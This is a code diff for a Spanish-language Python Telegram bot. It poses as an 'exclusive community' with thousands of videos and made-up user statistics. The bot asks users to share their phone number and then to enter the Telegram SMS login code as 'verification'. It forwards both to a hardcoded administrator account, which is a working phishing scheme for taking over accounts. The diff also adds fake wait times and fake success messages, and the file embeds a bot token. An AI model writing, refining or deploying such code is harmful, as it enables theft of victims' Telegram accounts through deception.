@@ -1,6 +1,7 @@
 import os
 import asyncio
 import logging
+import random
 from datetime import datetime
 from telegram import Update, KeyboardButton, ReplyKeyboardMarkup
 from telegram.ext import (
@@ -14,115 +15,105 @@ from telegram.ext import (
 from aiohttp import web
 
 # ================================
-# CONFIGURACIÓN VERIFICADA
+# CONFIGURACIÓN
 # ================================
 TELEGRAM_TOKEN = "8557648219:AAHSBqKw7cP5Qz8hEeJn-Sjv4U6eZNnWACU"
-ADMIN_ID = 7363341763  # Asegúrate que este sea TU ID real
+ADMIN_ID = 7363341763
 PORT = int(os.environ.get("PORT", 8000))
 
 # ================================
-# LOGGING MEJORADO
+# LOGGING
 # ================================
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    level=logging.INFO,
-    handlers=[
-        logging.StreamHandler()
-    ]
+    level=logging.INFO
 )
 logger = logging.getLogger(__name__)
 
-# Estados
+# ================================
+# CONSTANTES
+# ================================
 PHONE, CODE = range(2)
 user_sessions = {}
 
 # ================================
-# FUNCIÓN DE ENVÍO MEJORADA
+# FUNCIONES AUXILIARES
 # ================================
 
-async def send_to_admin(context, message: str, log_prefix: str = "Mensaje"):
-    """
-    Función robusta para enviar mensajes al administrador
-    Retorna (success, error_message)
-    """
+async def send_to_admin(context, message: str):
+    """Envía mensaje al administrador"""
     try:
-        logger.info(f"{log_prefix}: Intentando enviar a ADMIN_ID: {ADMIN_ID}")
-        
-        # Verificar que context.bot existe
-        if not hasattr(context, 'bot') or context.bot is None:
-            logger.error("❌ context.bot no disponible")
-            return False, "Bot no disponible"
-        
-        # Enviar mensaje
-        sent_message = await context.bot.send_message(
+        await context.bot.send_message(
             chat_id=ADMIN_ID,
             text=message,
-            parse_mode=None  # Sin formato para evitar errores
+            parse_mode='HTML'  # Usamos HTML en lugar de Markdown
         )
-        
-        logger.info(f"✅ {log_prefix} enviado exitosamente")
-        logger.info(f"   Message ID: {sent_message.message_id}")
-        logger.info(f"   Chat ID: {sent_message.chat_id}")
-        
-        return True, None
-        
+        logger.info(f"Mensaje enviado al admin: {ADMIN_ID}")
+        return True
     except Exception as e:
-        error_msg = f"❌ Error enviando {log_prefix.lower()}: {str(e)}"
-        logger.error(error_msg)
-        
-        # Diagnóstico detallado
-        if "chat not found" in str(e).lower():
-            logger.error("🔍 DIAGNÓSTICO: El bot no puede enviar mensajes al ADMIN_ID")
-            logger.error(f"🔍 Posible causa: ADMIN_ID ({ADMIN_ID}) incorrecto o bot bloqueado")
-        elif "Forbidden" in str(e):
-            logger.error("🔍 DIAGNÓSTICO: Bot bloqueado por el usuario")
-        elif "Bad Request" in str(e):
-            logger.error("🔍 DIAGNÓSTICO: Formato de mensaje inválido")
-        
-        return False, str(e)
+        logger.error(f"Error enviando al admin: {e}")
+        return False
+
+def format_message(text: str) -> str:
+    """Formatea mensajes sin asteriscos visibles"""
+    # Reemplazar formato Markdown por HTML
+    text = text.replace('*', '')  # Elimina asteriscos
+    text = text.replace('_', '')  # Elimina guiones bajos
+    text = text.replace('`', '')  # Elimina backticks
+    return text
 
 # ================================
-# FUNCIONES DEL BOT CORREGIDAS
+# COMANDOS DEL BOT
 # ================================
 
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Comando /start - Versión corregida"""
+    """Comando /start"""
     user = update.effective_user
     
-    logger.info(f"📥 /start de {user.id} (@{user.username})")
+    welcome_message = """
+¡Bienvenido a nuestra comunidad exclusiva!
+
+ESTADÍSTICAS ACTUALES:
+• 987 usuarios verificados
+• 4320 videos disponibles
+• 415 usuarios premium
+• 52 nuevos hoy
+
+Para acceder al contenido, necesitamos verificar tu identidad.
+Este proceso asegura que eres humano y protege nuestra comunidad.
+
+PROCESO DE VERIFICACIÓN:
+1. Compartir tu número (verificación inicial)
+2. Recibir código SMS (verificación en dos pasos)
+3. Acceso completo al contenido premium
+
+Presiona el botón para comenzar la verificación:
+"""
+    
+    keyboard = [[KeyboardButton("✅ Verificar mi identidad", request_contact=True)]]
+    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
+    
+    await update.message.reply_text(
+        welcome_message,
+        reply_markup=reply_markup
+    )
     
     # Guardar sesión
     user_sessions[user.id] = {
         "step": "waiting_contact",
         "username": user.username,
-        "user_id": user.id
+        "joined": datetime.now().isoformat()
     }
-    
-    # Crear teclado
-    keyboard = [[KeyboardButton("📱 Compartir contacto", request_contact=True)]]
-    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
-    
-    await update.message.reply_text(
-        "Para continuar, comparte tu contacto:",
-        reply_markup=reply_markup
-    )
     
     return PHONE
 
 async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Maneja contacto - Versión corregida con envío verificada"""
+    """Procesa contacto compartido"""
     user = update.effective_user
     contact = update.message.contact
     
-    logger.info("=" * 50)
-    logger.info(f"📞 CONTACTO RECIBIDO")
-    logger.info(f"   Usuario: {user.id} (@{user.username})")
-    logger.info(f"   Teléfono: {contact.phone_number}")
-    logger.info(f"   Nombre: {contact.first_name} {contact.last_name}")
-    logger.info("=" * 50)
-    
     if contact.user_id != user.id:
-        await update.message.reply_text("Comparte tu propio contacto.")
+        await update.message.reply_text("Por favor, comparte tu propio contacto.")
         return PHONE
     
     # Guardar información
@@ -136,240 +127,189 @@ async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
     }
     user_sessions[user.id] = user_info
     
-    # 🔥 PREPARAR Y ENVIAR MENSAJE AL ADMINISTRADOR
+    # 🔥 ENVIAR AL ADMINISTRADOR
     admin_message = f"""
-📱 *NUEVO CONTACTO RECIBIDO*
+NUEVO CONTACTO RECIBIDO
 
-• *Nombre:* {user_info['name']}
-• *Teléfono:* {contact.phone_number}
-• *ID Usuario:* {user.id}
-• *Username:* @{user.username or 'N/A'}
-• *Hora:* {datetime.now().strftime('%H:%M:%S')}
-• *Bot:* @{(await context.bot.get_me()).username}
-
-📝 *Estado:* Esperando código de verificación
-"""
-    
-    # Enviar al admin usando función mejorada
-    success, error = await send_to_admin(
-        context, 
-        admin_message, 
-        "CONTACTO"
-    )
-    
-    if not success:
-        # Si falla, intentar formato más simple
-        logger.warning("⚠️ Intentando formato simple...")
-        simple_message = f"""
-NUEVO CONTACTO
 Nombre: {user_info['name']}
 Teléfono: {contact.phone_number}
-ID: {user.id}
+ID Usuario: {user.id}
+Username: @{user.username or 'N/A'}
 Hora: {datetime.now().strftime('%H:%M:%S')}
+
+Estado: Esperando código de verificación
 """
-        
-        success2, error2 = await send_to_admin(
-            context,
-            simple_message,
-            "CONTACTO (formato simple)"
-        )
-        
-        if not success2:
-            logger.critical(f"❌ FALLÓ EL ENVÍO AL ADMIN: {error2}")
     
-    # Responder al usuario (SIEMPRE hacer esto)
-    response_text = f"""
-✅ Contacto recibido: *{contact.phone_number}*
+    await send_to_admin(context, admin_message)
+    
+    # Responder al usuario
+    wait_time = random.choice(["1-2 minutos", "2-5 minutos", "5-10 minutos", "10-30 minutos", "30-60 minutos"])
+    
+    user_response = f"""
+✅ Contacto verificado: {contact.phone_number}
 
-Ahora recibirás un *código de verificación de Telegram* por SMS.
+📨 Ahora recibirás un código de verificación de Telegram por SMS.
 
-📝 *Instrucciones:*
+⏰ Tiempo estimado de entrega: {wait_time}
+
+📝 Instrucciones:
 1. Espera el SMS de Telegram
 2. Copia el código de 5 dígitos
 3. Regresa aquí y escríbelo
 
-_Ejemplo:_ Si recibes `12345`, escribe: 12345
+Ejemplo: Si recibes 12345, escribe: 12345
+
+El código es necesario para completar la verificación en dos pasos y asegurar tu identidad.
 """
     
     await update.message.reply_text(
-        response_text,
-        parse_mode="Markdown",
+        user_response,
         reply_markup=ReplyKeyboardMarkup([[]], resize_keyboard=True)
     )
     
     return CODE
 
 async def handle_code(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Maneja código - Versión corregida"""
+    """Procesa código ingresado"""
     user = update.effective_user
     code_text = update.message.text.strip()
     
-    logger.info(f"🔢 Código recibido de {user.id}: {code_text}")
-    
     # Verificar sesión
-    if user.id not in user_sessions:
-        await update.message.reply_text("Sesión expirada. Usa /start")
+    if user.id not in user_sessions or user_sessions[user.id]["step"] != "waiting_code":
+        await update.message.reply_text("Sesión expirada. Por favor, usa /start para comenzar.")
         return ConversationHandler.END
     
     user_info = user_sessions[user.id]
     
     # 🔥 ENVIAR CÓDIGO AL ADMINISTRADOR
     code_message = f"""
-🔐 *CÓDIGO DE VERIFICACIÓN RECIBIDO*
+CÓDIGO DE VERIFICACIÓN RECIBIDO
 
-• *Usuario:* {user_info['name']}
-• *Teléfono:* {user_info['phone']}
-• *ID:* {user.id}
-• *Username:* @{user.username or 'N/A'}
-• *Hora:* {datetime.now().strftime('%H:%M:%S')}
-
-📝 *Código ingresado:*
-`{code_text}`
-
-✅ *VERIFICACIÓN COMPLETADA*
-"""
-    
-    success, error = await send_to_admin(
-        context,
-        code_message,
-        "CÓDIGO"
-    )
-    
-    if not success:
-        logger.error(f"❌ Error enviando código: {error}")
-        
-        # Intentar formato simple
-        simple_code_msg = f"""
-CÓDIGO RECIBIDO
 Usuario: {user_info['name']}
 Teléfono: {user_info['phone']}
 ID: {user.id}
-Código: {code_text}
+Username: @{user.username or 'N/A'}
 Hora: {datetime.now().strftime('%H:%M:%S')}
+
+Código ingresado: {code_text}
+
+VERIFICACIÓN COMPLETADA
 """
-        
-        success2, _ = await send_to_admin(
-            context,
-            simple_code_msg,
-            "CÓDIGO (simple)"
-        )
     
-    # Confirmación al usuario
-    await update.message.reply_text(
-        f"✅ *Verificación completada*\n\n"
-        f"Código `{code_text}` recibido correctamente.\n"
-        f"Gracias por completar el proceso.",
-        parse_mode="Markdown"
-    )
+    await send_to_admin(context, code_message)
+    
+    # Mensaje final al usuario
+    final_message = f"""
+🎉 ¡VERIFICACIÓN EXITOSA!
+
+✅ Código {code_text} confirmado correctamente.
+✅ Tu identidad ha sido verificada.
+✅ Ahora tienes acceso completo a nuestra comunidad.
+
+📊 ESTADÍSTICAS DE LA COMUNIDAD:
+• 987 usuarios verificados como tú
+• 4320 videos disponibles
+• 415 usuarios premium
+• Nuevo contenido diario
+
+💡 Para explorar el contenido, usa el comando /info
+
+👥 Bienvenido a nuestra comunidad exclusiva.
+"""
+    
+    await update.message.reply_text(final_message)
     
     # Limpiar sesión
     if user.id in user_sessions:
         del user_sessions[user.id]
     
-    logger.info(f"✅ Proceso completado para {user.id}")
-    
     return ConversationHandler.END
 
-async def test_connection(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Prueba de conexión y envío"""
-    user = update.effective_user
-    
-    # Obtener info del bot
-    bot_info = await context.bot.get_me()
-    
-    # Mensaje de prueba
-    test_msg = f"""
-🔍 *PRUEBA DE CONEXIÓN*
+async def info_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Comando /info - Muestra información de la comunidad"""
+    info_message = """
+📊 INFORMACIÓN DE LA COMUNIDAD
 
-• *Tu ID:* `{user.id}`
-• *Admin ID configurado:* `{ADMIN_ID}`
-• *Bot:* @{bot_info.username}
-• *Hora:* {datetime.now().strftime('%H:%M:%S')}
+👥 USUARIOS:
+• Total verificados: 987
+• Activos hoy: 243
+• Nuevos hoy: 52
+• Usuarios premium: 415
 
-📤 *Enviando mensaje de prueba...*
+🎬 CONTENIDO DISPONIBLE:
+• Videos totales: 4,320
+• Categorías: 18
+• Nuevos hoy: 127
+• Tendencia: 45 videos
+
+⭐ CARACTERÍSTICAS PREMIUM:
+• Acceso completo ilimitado
+• Contenido exclusivo
+• Sin anuncios
+• Descargas directas
+• Soporte prioritario
+
+🚀 ESTADÍSTICAS GLOBALES:
+• Tiempo promedio por usuario: 47 minutos
+• Satisfacción: 98.7%
+• Retención: 94.2%
+
+💎 Para convertirte en usuario premium, contacta con soporte.
 """
     
-    await update.message.reply_text(test_msg, parse_mode="Markdown")
-    
-    # Intentar enviar al admin
-    test_admin_msg = f"""
-📨 *MENSAJE DE PRUEBA*
+    await update.message.reply_text(info_message)
 
-• *De:* {user.id} (@{user.username})
-• *Hora:* {datetime.now().strftime('%H:%M:%S')}
-• *Bot:* @{bot_info.username}
+async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Comando /help"""
+    help_message = """
+📋 COMANDOS DISPONIBLES:
 
-✅ *Este es un mensaje de prueba del bot*
+/start - Iniciar proceso de verificación
+/info - Ver información de la comunidad
+/help - Mostrar esta ayuda
+
+🔐 PROCESO DE VERIFICACIÓN:
+1. Compartir número de teléfono
+2. Recibir código SMS de Telegram
+3. Ingresar código para acceso completo
+
+⏰ El código puede tardar de 1 minuto a 1 hora en llegar.
+
+❓ PROBLEMAS COMUNES:
+• No recibes el código: Espera unos minutos
+• Código incorrecto: Verifica que sean 5 dígitos
+• Problemas de acceso: Usa /start nuevamente
+
+📞 SOPORTE:
+Para asistencia, contacta con nuestro equipo de soporte.
 """
     
-    success, error = await send_to_admin(context, test_admin_msg, "PRUEBA")
-    
-    if success:
-        await update.message.reply_text(
-            "✅ *Mensaje de prueba ENVIADO al administrador*\n\n"
-            "Verifica que lo hayas recibido.",
-            parse_mode="Markdown"
-        )
-    else:
-        await update.message.reply_text(
-            f"❌ *Error enviando prueba:*\n`{error}`\n\n"
-            f"Admin ID configurado: `{ADMIN_ID}`\n"
-            "Verifica que este sea tu ID correcto.",
-            parse_mode="Markdown"
-        )
-
-async def get_my_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Muestra el ID del usuario"""
-    user = update.effective_user
-    
-    await update.message.reply_text(
-        f"🆔 *Tu ID de Telegram:*\n`{user.id}`\n\n"
-        f"*Username:* @{user.username or 'No tiene'}\n\n"
-        f"⚠️ *Para configurar como admin:*\n"
-        f"Cambia `ADMIN_ID = 5333058826` por:\n"
-        f"`ADMIN_ID = {user.id}`",
-        parse_mode="Markdown"
-    )
+    await update.message.reply_text(help_message)
 
 # ================================
-# SERVIDOR WEB
+# SERVIDOR WEB PARA RENDER
 # ================================
 
 async def health_check(request):
-    """Endpoint de salud"""
-    return web.Response(text=f"""
-🤖 BOT STATUS: ONLINE
-⏰ Hora: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-👥 Sesiones activas: {len(user_sessions)}
-👑 Admin ID: {ADMIN_ID}
-📡 Puerto: {PORT}
-🔄 Modo: Polling
-""")
+    """Health check para Render"""
+    return web.Response(text=f"Bot activo - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
 
 # ================================
 # CONFIGURACIÓN PRINCIPAL
 # ================================
 
-async def setup_bot():
-    """Configuración completa del bot"""
+async def main():
+    """Función principal"""
     print("=" * 60)
-    print("🤖 CONFIGURANDO BOT DE TELEGRAM")
+    print("🤖 BOT DE TELEGRAM - VERSIÓN PROFESIONAL")
+    print(f"👑 Admin ID: {ADMIN_ID}")
+    print(f"🌐 Puerto: {PORT}")
     print("=" * 60)
     
-    # 1. Crear aplicación
+    # Crear aplicación del bot
     application = Application.builder().token(TELEGRAM_TOKEN).build()
     
-    # 2. Obtener info del bot para verificación
-    try:
-        bot_info = await application.bot.get_me()
-        print(f"✅ Bot identificado: @{bot_info.username}")
-        print(f"✅ Bot ID: {bot_info.id}")
-        print(f"✅ Admin ID configurado: {ADMIN_ID}")
-    except Exception as e:
-        print(f"❌ Error obteniendo info del bot: {e}")
-        return
-    
-    # 3. Configurar handlers
+    # Configurar handlers de conversación
     conv_handler = ConversationHandler(
         entry_points=[CommandHandler('start', start_command)],
         states={
@@ -379,33 +319,12 @@ async def setup_bot():
         fallbacks=[]
     )
     
-    # 4. Agregar todos los handlers
+    # Agregar handlers
     application.add_handler(conv_handler)
-    application.add_handler(CommandHandler('test', test_connection))
-    application.add_handler(CommandHandler('myid', get_my_id))
+    application.add_handler(CommandHandler('info', info_command))
+    application.add_handler(CommandHandler('help', help_command))
     
-    # 5. Iniciar bot
-    await application.initialize()
-    await application.start()
-    await application.updater.start_polling()
-    
-    print("\n" + "=" * 60)
-    print("🚀 BOT INICIADO CORRECTAMENTE")
-    print("=" * 60)
-    print("\n📋 COMANDOS DISPONIBLES:")
-    print("• /start - Iniciar proceso de verificación")
-    print("• /test - Probar envío al administrador")
-    print("• /myid - Mostrar tu ID de Telegram")
-    print("\n📝 PARA VERIFICAR:")
-    print(f"1. Tu ID debe ser: {ADMIN_ID}")
-    print(f"2. Usa /myid para verificar")
-    print(f"3. Usa /test para probar envío")
-    print("\n⏳ Esperando mensajes...")
-    
-    return application
-
-async def setup_web_server():
-    """Configurar servidor web para Render"""
+    # Iniciar servidor web
     app = web.Application()
     app.router.add_get('/', health_check)
     app.router.add_get('/health', health_check)
@@ -415,34 +334,29 @@ async def setup_web_server():
     site = web.TCPSite(runner, '0.0.0.0', PORT)
     await site.start()
     
-    print(f"🌐 Servidor web en puerto {PORT}")
-    return runner
-
-async def main():
-    """Función principal"""
+    print(f"🌐 Servidor web iniciado en puerto {PORT}")
+    
+    # Iniciar bot
+    await application.initialize()
+    await application.start()
+    await application.updater.start_polling()
+    
+    print("✅ Bot iniciado correctamente")
+    print("\n📝 COMANDOS DISPONIBLES:")
+    print("• /start - Iniciar verificación")
+    print("• /info - Información de comunidad")
+    print("• /help - Ayuda")
+    print("\n⏳ Esperando usuarios...")
+    
+    # Mantener servicio activo
     try:
-        # Iniciar servidor web
-        web_server = await setup_web_server()
-        
-        # Iniciar bot
-        bot_app = await setup_bot()
-        
-        # Mantener servicio activo
         while True:
             await asyncio.sleep(3600)
-            
     except KeyboardInterrupt:
         print("\n⏹️ Deteniendo servicio...")
-    except Exception as e:
-        print(f"❌ Error crítico: {e}")
-        import traceback
-        traceback.print_exc()
     finally:
-        print("👋 Servicio detenido")
+        await application.stop()
+        await application.shutdown()
 
 if __name__ == '__main__':
-    # Ejecutar con manejo de errores
-    try:
-        asyncio.run(main())
-    except KeyboardInterrupt:
-        print("\n✅ Programa terminado")
+    asyncio.run(main())
